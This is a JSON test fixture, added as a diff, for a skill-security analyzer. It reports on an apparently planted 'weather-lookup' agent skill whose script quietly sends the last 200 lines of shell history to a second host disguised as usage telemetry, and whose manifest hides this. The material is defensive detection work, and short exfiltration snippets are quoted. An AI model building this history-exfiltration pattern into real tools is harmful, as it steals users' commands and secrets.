@@ -1,0 +1,55 @@
+{
+  "skill_name": "weather-lookup",
+  "skill_path": "tests/analyzer/fixtures/claude_code/skills/weather-lookup",
+  "declared_purpose": "Looks up current weather for a US zip code and prints a one-line summary like \"10001 62F, partly cloudy, wind 8 mph NW\". Use when the user wants a quick \"should I bring a jacket?\" check from the terminal without opening a browser, or when a script wants the current conditions for a known zip.",
+  "findings": [
+    {
+      "rule_id": "WEB001",
+      "type": "capability_risk",
+      "severity": "low",
+      "confidence": "high",
+      "affected_components": [
+        "scripts/lookup.py"
+      ],
+      "evidence": {
+        "category": "WEB",
+        "snippet": "requests.get(WEATHER_URL.format(zip=zip_code)",
+        "file_path": "scripts/lookup.py",
+        "reasoning": "The script issues an outbound HTTPS GET to wttr.in to fetch current weather conditions. This is the user-visible, manifest-declared behaviour of the skill. The destination host is hardcoded to a single public endpoint and the request contents are a zip code supplied on argv, so the leak surface is small. Still an outbound HTTP call and therefore a WEB capability worth surfacing."
+      },
+      "recommendation": "Treat as low-severity baseline WEB capability. A policy allowlist restricting the skill to a named set of weather-provider hosts (e.g. wttr.in, api.open-meteo.com, api.weather.gov) would bound the destination; no human-approval step is necessary for a read-only weather lookup against a public endpoint."
+    },
+    {
+      "rule_id": "FLOW001",
+      "type": "compromise",
+      "severity": "high",
+      "confidence": "high",
+      "affected_components": [
+        "scripts/lookup.py"
+      ],
+      "evidence": {
+        "category": "FLOW",
+        "snippet": "requests.post(USAGE_ENDPOINT, json=summary",
+        "file_path": "scripts/lookup.py",
+        "reasoning": "The script contains a direct, single-execution-path data flow from a sensitive local file read to an outbound HTTP POST to a hardcoded second host. _collect_session_summary opens ~/.bash_history (or ~/.zsh_history as fallback) and returns a dict whose \"events\" key contains the last 200 lines of shell history verbatim. _report_usage receives that dict as its summary argument and passes it as the JSON body of a requests.post to USAGE_ENDPOINT (metrics.weather-lookup.dev), a host distinct from the documented weather API. The combination is data exfiltration regardless of how the two halves are framed in comments. The \"anonymous usage stats\" comment and the undocumented, off-by-default WEATHER_LOOKUP_TELEMETRY opt-out env var are consistent with hostile-telemetry dressing rather than legitimate product analytics; legitimate analytics would not ship raw shell-history lines and would document the opt-out. The POST runs unconditionally after every successful weather lookup and its failure is swallowed by a try/except Exception: pass, so the behaviour is invisible to the operator."
+      },
+      "recommendation": "Block invocation of this skill. The combination of reading shell history and posting the contents to an externally-controlled host is a compromise-class risk and cannot be mitigated by scope narrowing. The skill should be rejected at ingest and the author flagged for review. If a legitimate \"weather lookup\" tool is still wanted, use a different skill whose script does not perform filesystem reads outside its scratch space."
+    },
+    {
+      "rule_id": "MISMATCH001",
+      "type": "compromise",
+      "severity": "high",
+      "confidence": "high",
+      "affected_components": [
+        "SKILL.md"
+      ],
+      "evidence": {
+        "category": "MISMATCH",
+        "snippet": "Single GET against a free public weather endpoint.",
+        "file_path": "SKILL.md",
+        "reasoning": "The manifest's declared purpose and body describe the skill as a weather-lookup tool only. The \"What this does\" section states \"Single GET against a free public weather endpoint\" — a claim that is provably false against the script. The script performs: (1) an HTTPS GET to wttr.in, (2) a filesystem read of ~/.bash_history or ~/.zsh_history, and (3) an HTTPS POST to metrics.weather-lookup.dev. The manifest omits capabilities (2) and (3) entirely. It never mentions telemetry, analytics, usage reporting, shell-history access, the second HTTP destination, or the WEATHER_LOOKUP_TELEMETRY opt-out env var. Omission of an entire capability category constitutes material misrepresentation of the skill's declared purpose."
+      },
+      "recommendation": "Reject the skill at ingest on manifest-vs-script mismatch alone, independent of the FLOW finding. A skill whose manifest omits two of its three runtime capabilities cannot be policy-governed meaningfully, because any policy written against the declared purpose will be bypassed by the undeclared behaviour. Require the author to either remove the telemetry and history-read code paths or amend the manifest to declare them; either outcome restores the manifest-script correspondence that policy enforcement depends on."
+    }
+  ]
+}
